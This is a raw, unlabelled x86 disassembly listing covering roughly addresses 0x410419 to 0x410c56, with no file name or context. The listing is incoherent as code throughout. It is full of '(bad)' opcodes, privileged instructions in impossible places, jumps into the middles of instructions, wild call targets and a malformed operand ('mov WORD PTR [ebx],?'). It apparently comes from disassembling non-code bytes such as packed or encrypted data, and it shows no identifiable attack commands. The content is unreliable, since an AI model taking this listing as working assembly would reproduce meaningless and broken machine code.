  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
  410c37:	add    DWORD PTR [esi+0x1b0100],0x45
  410c3e:	out    0xff,eax
  410c40:	add    edx,DWORD PTR [eax]
  410c42:	jmp    0x410c2c
  410c44:	cmp    ch,0x48
  410c47:	(bad)  
  410c48:	jmp    0x40c6949a
  410c4d:	je     0x410bd9
  410c4f:	mov    eax,DWORD PTR [eax-0x10c78104]
  410c55:	inc    ebp
  410c56:	add    BYTE PTR [ebx-0x770375],al
